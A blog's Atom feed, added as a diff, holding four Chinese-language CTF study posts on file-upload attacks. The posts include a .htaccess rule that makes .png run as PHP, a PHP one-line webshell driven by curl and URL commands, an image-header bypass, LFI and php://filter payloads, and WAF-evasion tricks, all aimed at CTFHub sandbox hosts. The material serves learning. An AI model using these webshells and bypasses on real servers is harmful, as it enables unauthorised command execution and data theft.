@@ -1,0 +1,247 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <author>
+    <name>Crow.</name>
+  </author>
+  <generator uri="https://hexo.io/">Hexo</generator>
+  <id>https://lzzy-rz.github.io/Crow.github.io/</id>
+  <link href="https://lzzy-rz.github.io/Crow.github.io/" rel="alternate"/>
+  <link href="https://lzzy-rz.github.io/Crow.github.io/atom.xml" rel="self"/>
+  <rights>All rights reserved 2026, Crow.</rights>
+  <subtitle>Crow. 的网络安全学习记录，记录 CTF、Web 安全与从 0 到 1 的成长过程。</subtitle>
+  <title>Crow.</title>
+  <updated>2026-11-13T10:49:13.324Z</updated>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="Web安全" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
+    <category term="Web" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Web/"/>
+    <category term="小专栏" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
+    <category term="Apache" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Apache/"/>
+    <content>
+      <![CDATA[<p>写在前面:今天打了一道.htaccess文件上传,问的接入Deepseek的Codex和Workbuddy,做题基本上是靠复制粘贴,重在理解概念,但是我发现这两个Agent似乎不太适合教学,到底是Agent,对话能力和教学能力还要好好训练一下.本来那篇文章写完,这个知识点就应该告一段落的,都怪我手欠,吃饭的时候问了Deepseek(对话版)一嘴,这下好了,不得不再更一篇博客,开始文章之前,给大家看看小鸟,过来蹭饭的,右上角那只不是我没拍好,是它不太配合[狗头]</p><img width="960" height="1280" alt="a599bfdf9488241640936de62dd6a282_720" src="https://github.com/user-attachments/assets/41ab18b7-f012-4445-9736-54a3b9fe2d2e" /><h2 id="为什么值得一写"><a href="#为什么值得一写" class="headerlink" title="为什么值得一写:"></a>为什么值得一写:</h2><p>.htaccess它的全称是Hypertext Access(超文本访问),是Apache服务器专属的一个配置文件,能放在特定的目录下.它的功能远远不止修改解析方式这么简单,还有改写规则(URL Rewrite),访问控制(设置密码,或禁止某些ip访问)(摘录于deepseek对话端)</p><h2 id="改写规则-URL-Rewrite"><a href="#改写规则-URL-Rewrite" class="headerlink" title="改写规则(URL Rewrite)"></a>改写规则(URL Rewrite)</h2><p>当我在手机上看见URL Rewrite时,条件反射想到了钓鱼网站和恶意跳转,于是追问了一嘴,果然,我联想对了,黑客可以通过.htaccess在后台重写用户访问的URL,但是用户看见的是他以为的官网</p><p>除此之外,还有别的阴招吗?有的兄弟&#x2F;姐妹,有的.黑客还可以利用它完成流量分发</p><h2 id="流量分发-Traffic-Filtering"><a href="#流量分发-Traffic-Filtering" class="headerlink" title="流量分发(Traffic Filtering)"></a>流量分发(Traffic Filtering)</h2><p>这个阴在,它可以躲过安全扫描器的查杀,然后将访问的用户领向钓鱼页面,黑客通过在.htaccess里面写规则,识别访问者的设备指纹,发现是安全扫描器的爬虫,,就返回404正常界面,发现是微信&#x2F;苹果的UA,就甩出钓鱼界面,这样的网站能够存活很久而不被封.</p><p>还有</p><h2 id="隐藏钓鱼文件-逃避溯源"><a href="#隐藏钓鱼文件-逃避溯源" class="headerlink" title="隐藏钓鱼文件(逃避溯源)"></a>隐藏钓鱼文件(逃避溯源)</h2><p>黑客将钓鱼文件改成没有意义的名字,用.htaccess告诉服务器,将这个文件用PHP来解析,从而实现隐藏后门,这样安全人员很难找到黑客执行的脚本(与在ctf题里将.php伪装成.png是同一个逻辑)</p><p>还有</p><h2 id="SEO劫持"><a href="#SEO劫持" class="headerlink" title="SEO劫持"></a>SEO劫持</h2><p>搜索引擎上看见的是正经文章,但是点进去就跳转到了”澳门赌场”,”诈骗网站”既实现了欺骗爬虫,又劫持了流量</p><h2 id="那么做为一个安全人员-目前来说-是未来的安全人员-我们应该怎么破局呢"><a href="#那么做为一个安全人员-目前来说-是未来的安全人员-我们应该怎么破局呢" class="headerlink" title="那么做为一个安全人员(目前来说,是未来的安全人员),我们应该怎么破局呢:"></a>那么做为一个安全人员(目前来说,是未来的安全人员),我们应该怎么破局呢:</h2><ul><li><strong>A,</strong> 直接摸文件:尝试直接访问<code>http://目标网站/.htaccess</code>如果浏览器能直接下载下来这个文件,那我们就拿到了黑客做的手脚,可以进一步分析</li><li><strong>B,</strong> 看流量走向:用浏览器的F12看网络请求(Network),看看有没有乱七八糟的跳转</li><li><strong>C,</strong> 修改UA测试:用Burpsuite抓包,将请求头的User-Agent改成Googlebot(谷歌爬虫),看看页面是不是换了个模样</li></ul><h2 id="如何规避漏洞"><a href="#如何规避漏洞" class="headerlink" title="如何规避漏洞:"></a>如何规避漏洞:</h2><ul><li><strong>A,</strong> 禁用规则覆盖,禁止用户自定义.htaccess</li><li><strong>B,</strong> 拦截特殊文件:在WAF或后端代码中,直接禁止上传任何以.开头的文件</li></ul><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/11/13/htaccess%E5%B0%8F%E4%B8%93%E6%A0%8F/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/11/13/htaccess%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
+    <published>2026-11-13T09:52:46.000Z</published>
+    <summary>
+      <![CDATA[<p>写在前面:今天打了一道.htaccess文件上传,问的接入Deepseek的Codex和Workbuddy,做题基本上是靠复制粘贴,重在理解概念,但是我发现这两个Agent似乎不太适合教学,到底是Agent,对话能力和教学能力还要好好训练一下.本来那篇文章写完,这个知识点就]]>
+    </summary>
+    <title>.htaccess小专栏</title>
+    <updated>2026-11-13T10:49:13.324Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="CTF" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/CTF/"/>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="Curl" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Curl/"/>
+    <content>
+      <![CDATA[<p>工具:curl</p><p>环境:Ctfhub靶场</p><p>内容:验证文件上传.htaccess漏洞,找flag</p><p>原理:</p><ul><li><strong>A:</strong> 什么是.htaccess–&gt;他是一个目录级配置文件,可以管理哪个后缀的文件当做什么类型来处理</li><li><strong>B:</strong> 那么问题就来了,如果网站允许.htaccess生效,那么攻击者就可以通过上传一个写好的.htaccess来告诉Apache服务器:我后面所有上传的.png都当做.php来执行,这样一来,我们只需要将shell.php的后缀改成.png,就可以成功地上传并执行我们的一句话木马</li><li><strong>C:</strong> 用处:如果对上传文件的限制设置在服务器,那么我们可以通过上传一个恶意的.htaccess,让服务器把.png当做.php来执行</li></ul><h2 id="1-打开靶场-拿到URL"><a href="#1-打开靶场-拿到URL" class="headerlink" title="1,打开靶场,拿到URL"></a>1,打开靶场,拿到URL</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/<br></code></pre></td></tr></table></figure><h2 id="2-建一个cat-htaccess来实现将目录里的-png，都交给-PHP-解析的功能"><a href="#2-建一个cat-htaccess来实现将目录里的-png，都交给-PHP-解析的功能" class="headerlink" title="2,建一个cat .htaccess来实现将目录里的 .png，都交给 PHP 解析的功能"></a>2,建一个cat .htaccess来实现将目录里的 .png，都交给 PHP 解析的功能</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; .htaccess &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span><br>AddType application/x-httpd-php .png<br>EOF<br></code></pre></td></tr></table></figure><p>这里我没有看见文件,了解之后知道了因为.htaccess以.开头ls默认不显示,所以被隐藏了.</p><h2 id="3-因为-htaccess被隐藏了-所以直接在浏览器中上传非常之不方便-这里用curl来上传"><a href="#3-因为-htaccess被隐藏了-所以直接在浏览器中上传非常之不方便-这里用curl来上传" class="headerlink" title="3,因为.htaccess被隐藏了,所以直接在浏览器中上传非常之不方便,这里用curl来上传."></a>3,因为.htaccess被隐藏了,所以直接在浏览器中上传非常之不方便,这里用curl来上传.</h2><p>执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -F <span class="hljs-string">&quot;file=@.htaccess&quot;</span> -F <span class="hljs-string">&quot;submit=Submit&quot;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/<br></code></pre></td></tr></table></figure><p>成功的返回了路径upload&#x2F;.htaccess</p><img width="2470" height="852" alt="d75366450a41445de70dc127ab04eccc" src="https://github.com/user-attachments/assets/031664f0-8d7a-4634-a300-2287c7a94091" /><h2 id="4-制作木马并上传"><a href="#4-制作木马并上传" class="headerlink" title="4,制作木马并上传"></a>4,制作木马并上传</h2><p>执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%s&#x27;</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;value&quot;]); ?&gt;&#x27;</span> &gt; shell.png<br><span class="hljs-built_in">cat</span> shell.png<br>curl -F <span class="hljs-string">&quot;file=@shell.png&quot;</span> -F <span class="hljs-string">&quot;submit=Submit&quot;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/<br></code></pre></td></tr></table></figure><p>返回了路径upload&#x2F;shell.png</p><h2 id="5-验证-htaccess是否生效"><a href="#5-验证-htaccess是否生效" class="headerlink" title="5,验证.htaccess是否生效"></a>5,验证.htaccess是否生效</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;id&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><p>几种情况:</p><ul><li><strong>a,</strong> <code>404</code>–&gt;URL错了</li><li><strong>b,</strong> <code>&lt;?......?&gt;</code>原文–&gt;没生效</li><li><strong>c,</strong> 显示uid&#x3D;33(www-data)–&gt;成功生效</li></ul><img width="2394" height="906" alt="3aa6b363b64c9b8005c4d9ae81dc4137" src="https://github.com/user-attachments/assets/eae3a393-dfe4-4f5c-8856-45d4726b065d" /><h2 id="6-成功生效-去翻目录"><a href="#6-成功生效-去翻目录" class="headerlink" title="6,成功生效,去翻目录"></a>6,成功生效,去翻目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;pwd; echo ---; ls -la /&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><p>列出了根目录</p><img width="1372" height="94" alt="c4607b5e9248a0a0d77d182916465e13" src="https://github.com/user-attachments/assets/edf5bb2b-63cb-4768-85f0-a86fdfb847d9" /><p>去几个关键目录里找找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;ls -la /var/www/html; echo ---; ls -la /home; echo ---; ls -la /tmp&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><p>找到flag所在的文件了(flag_315471076.php)</p><img width="2107" height="412" alt="3843678f5aaa1a1c3e6d303a6d5eaea3" src="https://github.com/user-attachments/assets/07d4b432-f1ce-45e8-9748-0832cabc3eb4" /><h2 id="7-cat-the-flag"><a href="#7-cat-the-flag" class="headerlink" title="7,cat the flag"></a>7,cat the flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;value=system(&quot;cat /var/www/html/flag_315471076.php&quot;);&#x27;</span> http://challenge-e41bc8c8668bcc99.sandbox.ctfhub.com:10800/upload/shell.png<br></code></pre></td></tr></table></figure><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/11/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-htaccess/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/11/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-htaccess/"/>
+    <published>2026-11-13T06:13:08.000Z</published>
+    <summary>
+      <![CDATA[<p>工具:curl</p>
+<p>环境:Ctfhub靶场</p>
+<p>内容:验证文件上传.htaccess漏洞,找flag</p>
+<p>原理:</p>
+<ul>
+<li><strong>A:</strong> 什么是.htaccess–&gt;他是一个目录级配置文件,可以管]]>
+    </summary>
+    <title>文件上传(.htaccess)</title>
+    <updated>2026-11-13T07:20:54.445Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="信息读取" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96/"/>
+    <category term="CTF" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/CTF/"/>
+    <category term="Web" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Web/"/>
+    <category term="信息读取" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96/"/>
+    <category term="小专栏" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
+    <content>
+      <![CDATA[<p>写在前面:我们会遇见获取信息困难的情况,比如在Ctfhub中获取flag,有时网页中会返回空白,这时候往往需要用到base64获取信息再进行解码,于是我在ai的帮助下,在此梳理一些信息读取的方法.</p><h2 id="分析Ctfhub中网页显白的原因"><a href="#分析Ctfhub中网页显白的原因" class="headerlink" title="分析Ctfhub中网页显白的原因:"></a>分析Ctfhub中网页显白的原因:</h2><ul><li><strong>A.浏览器层面:</strong> 因为HTML是由各种标签组成的,在网页用Ctrl+U就能看见源码,你会发现里面有很多<code>&lt;</code>符号,浏览器遇见<code>&lt;</code>开头的,就会试图找到对应的标签.遇见<code>&lt;?</code>这种根本不认识的,不合规的标签结构,浏览器会直接把它当做”无效代码”给过滤掉,既不显示,也不报错.</li><li><strong>B.服务器层面:</strong> 如果直接访问一个.php文件,服务器其实是先把它执行了,然后吐一个空壳给浏览器.如果执行没输出,浏览器拿到的就是空白.</li></ul><p>那么<code>&lt;</code>究竟来自于哪里呢?是我们的一句话木马里的<code>&lt;?</code>导致的吗?</p><p>通过查询,我得出答案,不是的,是我们要查询的目标文件里的<code>&lt;</code>.因为Ctfhub中的flag经常放在.php文件中,所以里面用到的php语法自带有<code>&lt;</code>,而且这个php文件没有echo内容,因此没有回显</p><h2 id="访问的两种情况"><a href="#访问的两种情况" class="headerlink" title="访问的两种情况:"></a>访问的两种情况:</h2><ul><li><strong>A,</strong> 根据路径直接访问我们的目标文件，服务器端会执行目标文件（.php格式），但是由于这份文件里没有echo，所以没有回显</li><li><strong>B,</strong> 通过调用一句话木马来读取目标文件，比如用curl，它尝试会将目标文件原封不动的显示出来，但是浏览器看到<code>&lt;？</code>却不认识，于是直接吃掉，干脆不显示</li></ul><p>与我们的一句话木马一点关系都没有.</p><p>base64如何让浏览器放出内容？base64通过转码，将<code>&lt;</code>变成字母和数字的乱码让浏览器以为是正常的内容，于是输出显示.</p><p>base64的优势在于简单粗暴，但是也有不足的地方：</p><ul><li><strong>a,</strong> 可能被高级一点的防火墙ban掉，实战环境中很多网站会将base64列为疑似黑客行为，不让执行，还可能留下记录</li><li><strong>b,</strong> 长度:如果要读取的目标文件是长度比较大的，经过base64解码之后，长度更是会大大增加（会扩大33%），容易触发浏览器的URL限制，导致请求失败或者截断。</li></ul><h2 id="接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai-个人进行了整理）"><a href="#接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai-个人进行了整理）" class="headerlink" title="接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai,个人进行了整理）"></a>接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai,个人进行了整理）</h2><h3 id="A-RCE命令执行-比如通过一句话木马和命令注入等控制服务器后-在终端中执行"><a href="#A-RCE命令执行-比如通过一句话木马和命令注入等控制服务器后-在终端中执行" class="headerlink" title="A,RCE命令执行:比如通过一句话木马和命令注入等控制服务器后,在终端中执行"></a>A,RCE命令执行:比如通过一句话木马和命令注入等控制服务器后,在终端中执行</h3><h4 id="a-对普通文本-以flag-txt为例"><a href="#a-对普通文本-以flag-txt为例" class="headerlink" title="a,对普通文本:以flag.txt为例"></a>a,对普通文本:以flag.txt为例</h4><ul><li><code>cat /flag</code>:最常用,一次性把全文打印出来</li><li><code>tac /flag</code>:反向打印(从最后一行读到第一行),可以防过滤(当WAF把cat禁了,用tac往往可以实现绕过)</li><li><code>nl /flag</code>:带行号打印(方便看清结构),同时也有防过滤的功能</li><li><code>head -n 5 /flag 或 tail -n 5 /flag</code>:只看前5行或后五行</li><li><code>more /flag 或 less /flag</code>:分页查看(按空格键翻页,按q退出)(偶尔用于防止网页卡死,但体验一般)</li></ul><h4 id="b-对-php源码-图片二进制"><a href="#b-对-php源码-图片二进制" class="headerlink" title="b,对.php源码,图片二进制:"></a>b,对.php源码,图片二进制:</h4><ul><li><code>base64 /flag.php</code>:将文件内容转成base64编码</li><li><code>xxd /flag.php 或 hexdump -C /flag.php</code>:转成十六进制(Hex)来看,用于base64被WAF屏蔽时</li><li><code>strings /flag.png</code>:只提取文件里可打印的字符.(flag藏在图片或者二进制文件里,用这个可以过滤掉乱码)</li></ul><h4 id="c-搜索与定位-对知道的信息很少的的文件"><a href="#c-搜索与定位-对知道的信息很少的的文件" class="headerlink" title="c,搜索与定位(对知道的信息很少的的文件)"></a>c,搜索与定位(对知道的信息很少的的文件)</h4><ul><li><code>ls -la</code>:查看当前目录所有文件(包括隐藏文件.flag)</li><li><code>find / -name &quot;*flag*&quot; 2&gt;/dev/null</code>:全盘搜索文件名带flag的文件,其中2&gt;&#x2F;dev&#x2F;null是为了屏蔽没权限的报错,让屏幕干净.</li><li><code>grep -r &quot;ctfhub&quot; /var/www/html/</code>:全盘搜索文件内容中包含ctfhub的文件</li></ul><h3 id="B-LFI-文件包含-任意文件读取-用过URL读"><a href="#B-LFI-文件包含-任意文件读取-用过URL读" class="headerlink" title="B,LFI(文件包含&#x2F;任意文件读取)用过URL读"></a>B,LFI(文件包含&#x2F;任意文件读取)用过URL读</h3><h4 id="a-直接用路径读取-普通文件"><a href="#a-直接用路径读取-普通文件" class="headerlink" title="a,直接用路径读取(普通文件)"></a>a,直接用路径读取(普通文件)</h4><ul><li><code>?file=/etc/passwd</code>:直接读绝对路径</li><li><code>?file=../../../../flag.txt</code>:用..&#x2F;往上跳目录读.</li></ul><h4 id="b-PHP伪协议读取-对付各种源码-可以防止-php文件被服务器执行"><a href="#b-PHP伪协议读取-对付各种源码-可以防止-php文件被服务器执行" class="headerlink" title="b,PHP伪协议读取(对付各种源码)(可以防止,php文件被服务器执行)"></a>b,PHP伪协议读取(对付各种源码)(可以防止,php文件被服务器执行)</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?file=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><ul><li>告诉服务器将源码的原文用base64的方式打包出来.</li><li>解码后会得到纯净源码</li></ul><h3 id="C-客户端-外部工具读取-适用于网页限制太多的情况-直接在本地操作"><a href="#C-客户端-外部工具读取-适用于网页限制太多的情况-直接在本地操作" class="headerlink" title="C,客户端&#x2F;外部工具读取(适用于网页限制太多的情况,直接在本地操作)"></a>C,客户端&#x2F;外部工具读取(适用于网页限制太多的情况,直接在本地操作)</h3><ul><li><strong>a,</strong> <code>curl http://网址/flag.php</code>:在终端中请求网页,直接拿到服务器的原样输出(避开浏览器吃字符的问题)</li><li><strong>b,</strong> <code>Ctrl+U</code>:查看网页源码,看网页最初的样子</li></ul><h3 id="D-实战防拦截-如果cat-flag被WAF拦截了-说明空格或cat或-被拉黑了-这时候可以尝试一下变形"><a href="#D-实战防拦截-如果cat-flag被WAF拦截了-说明空格或cat或-被拉黑了-这时候可以尝试一下变形" class="headerlink" title="D,实战防拦截(如果cat &#x2F;flag被WAF拦截了,说明空格或cat或&#x2F;被拉黑了,这时候可以尝试一下变形)"></a>D,实战防拦截(如果cat &#x2F;flag被WAF拦截了,说明空格或cat或&#x2F;被拉黑了,这时候可以尝试一下变形)</h3><h4 id="a-空格被拦截"><a href="#a-空格被拦截" class="headerlink" title="a,空格被拦截"></a>a,空格被拦截</h4><ul><li>用<code>${IFS}</code>代替空格:<code>cat${IFS}/flag</code></li><li>用<code>&lt;</code>代替空格:<code>cat&lt;/flag</code></li><li>用<code>%09</code>(Tab键)代替空格:<code>?cmd=cat%09/flag</code></li></ul><h4 id="b-cat被拦截"><a href="#b-cat被拦截" class="headerlink" title="b,cat被拦截"></a>b,cat被拦截</h4><ul><li>用拼接:<code>ca&#39;&#39;t /flag</code>或<code>c\at /flag</code></li><li>用通配符:<code>/bin/ca* /fla*</code></li><li>用变量:<code>a=c;b=at;c=fl;d=ag; $a$b /$c$d</code></li></ul><h4 id="c-斜杠-被拦截了怎么办"><a href="#c-斜杠-被拦截了怎么办" class="headerlink" title="c,斜杠&#x2F;被拦截了怎么办"></a>c,斜杠&#x2F;被拦截了怎么办</h4><p>用环境变量代替:<code>cat ${PWD:0:1}flag</code> –&gt;PWD的第0到第一个字符刚好是&#x2F;</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
+    <id>https://lzzy-rz.github.io/Crow.github.io/2026/11/09/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96%E5%B0%8F%E4%B8%93%E6%A0%8F/</id>
+    <link href="https://lzzy-rz.github.io/Crow.github.io/2026/11/09/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96%E5%B0%8F%E4%B8%93%E6%A0%8F/"/>
+    <published>2026-11-09T15:33:50.000Z</published>
+    <summary>
+      <![CDATA[<p>写在前面:我们会遇见获取信息困难的情况,比如在Ctfhub中获取flag,有时网页中会返回空白,这时候往往需要用到base64获取信息再进行解码,于是我在ai的帮助下,在此梳理一些信息读取的方法.</p>
+<h2 id="分析Ctfhub中网页显白的原因"><a href=]]>
+    </summary>
+    <title>信息读取小专栏</title>
+    <updated>2026-11-10T15:12:16.719Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Crow.</name>
+    </author>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="CTF" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/CTF/"/>
+    <category term="文件上传" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    <category term="Burp Suite" scheme="https://lzzy-rz.github.io/Crow.github.io/tags/Burp-Suite/"/>
+    <content>
+      <![CDATA[<p>工具:burpsuite</p><p>题源:Ctfhub</p><p>内容:在文件上传文件头检查类型中拿到flag</p><p>原理:服务器通过检查文件的前几个字节来判断文件类型,后面的看都不看</p><p>思路:用图片马骗过服务器</p><h2 id="1-进入环境"><a href="#1-进入环境" class="headerlink" title="1,进入环境"></a>1,进入环境</h2><img width="2468" height="1386" alt="Image" src="https://github.com/user-attachments/assets/a523a360-14aa-4796-97cf-84f3810c7e2b" /><h2 id="2-上传之前的图片马-png"><a href="#2-上传之前的图片马-png" class="headerlink" title="2,上传之前的图片马(.png)"></a>2,上传之前的图片马(.png)</h2><p>上传成功并返回了路径</p><img width="2478" height="1214" alt="Image" src="https://github.com/user-attachments/assets/05c2de52-a5fe-4078-a467-e36e2cff04bd" /><img width="2480" height="1204" alt="Image" src="https://github.com/user-attachments/assets/a6a2975e-3a5d-49ef-9cee-a5daf10d3475" /><h2 id="3-改后缀为-php并重新上传-让服务器执行php指令"><a href="#3-改后缀为-php并重新上传-让服务器执行php指令" class="headerlink" title="3,改后缀为.php并重新上传(让服务器执行php指令)"></a>3,改后缀为.php并重新上传(让服务器执行php指令)</h2><p>很遗憾,上传失败</p><p>说明这题不止盯着文件头,还对上传的文件类型进行了限制</p><img width="2484" height="1178" alt="Image" src="https://github.com/user-attachments/assets/fb63d9d9-c808-4291-b1a9-dc17b807881d" /><h2 id="4-想到用burpsuite抓包改包"><a href="#4-想到用burpsuite抓包改包" class="headerlink" title="4,想到用burpsuite抓包改包"></a>4,想到用burpsuite抓包改包</h2><p>我们用之前的一个一句话木马重新做一个图片马(因为科比图片马里面没有参数,不能用来拿flag)</p><img width="656" height="534" alt="Image" src="https://github.com/user-attachments/assets/68ce0ef5-5f50-43c1-b335-32e22d0d9665" /><p>终端执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;GIF89a&#x27;</span>; <span class="hljs-built_in">cat</span> shell2.php; &#125; &gt; shell2.png<br></code></pre></td></tr></table></figure><p>前面的GIF89a是用来骗过文件头检查的,后面直接就是一句话木马</p><p>进行抓包改包,把.png换成.php后send</p><p>显示上传成功,并返回路径</p><img width="2484" height="1214" alt="Image" src="https://github.com/user-attachments/assets/5fc9990c-f512-4d34-8a7b-9161346f9235" /><h2 id="5-运行木马"><a href="#5-运行木马" class="headerlink" title="5,运行木马"></a>5,运行木马</h2><h3 id="a-查看目录"><a href="#a-查看目录" class="headerlink" title="a,查看目录"></a>a,查看目录</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/upload/shell2.php?cmd=ls%20/<br></code></pre></td></tr></table></figure><p>成功返回:说明木马有效</p><img width="2484" height="1266" alt="Image" src="https://github.com/user-attachments/assets/b6867ead-fa3f-4b4b-b9b1-1dd11670c06f" /><h3 id="b-找flag"><a href="#b-找flag" class="headerlink" title="b,找flag"></a>b,找flag</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/upload/shell2.php?cmd=find%20/%20-name%20%22flag*%22%202%3E/dev/null<br></code></pre></td></tr></table></figure><p>找到了flag的路径<code>/var/www/html/flag_1709510835.php</code></p><img width="2484" height="1290" alt="Image" src="https://github.com/user-attachments/assets/2edba8eb-855b-4dcb-aaec-4d239eda6fe1" /><h3 id="c-访问flag的目录"><a href="#c-访问flag的目录" class="headerlink" title="c,访问flag的目录"></a>c,访问flag的目录</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/flag_1709510835.php<br></code></pre></td></tr></table></figure><p>仅返回图片马里的文件头</p><p>估计是要用base64,这是ctfhub的常用套路</p><img width="2486" height="1286" alt="Image" src="https://github.com/user-attachments/assets/3fe8148d-cd0d-4f60-99fa-13fbdb11a686" /><h3 id="d-用base64重新访问"><a href="#d-用base64重新访问" class="headerlink" title="d,用base64重新访问"></a>d,用base64重新访问</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://challenge-898cce34929d2270.sandbox.ctfhub.com:10800/upload/shell2.php?cmd=base64%20/var/www/html/flag_1709510835.php<br></code></pre></td></tr></table></figure><img width="2480" height="1280" alt="Image" src="https://github.com/user-attachments/assets/4a518811-6c5e-4b28-9391-f3af5f7ebfb6" /><h3 id="e-得到乱码-交给在线解码平台解码"><a href="#e-得到乱码-交给在线解码平台解码" class="headerlink" title="e,得到乱码,交给在线解码平台解码"></a>e,得到乱码,交给在线解码平台解码</h3><p>记得删掉前面伪装图片的字符,不然解码会乱</p><img width="946" height="748" alt="Image" src="https://github.com/user-attachments/assets/f6db3919-3e26-4cd2-ab45-0cd6a50b6835" /><p>成功拿到flag</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]>
+    </content>
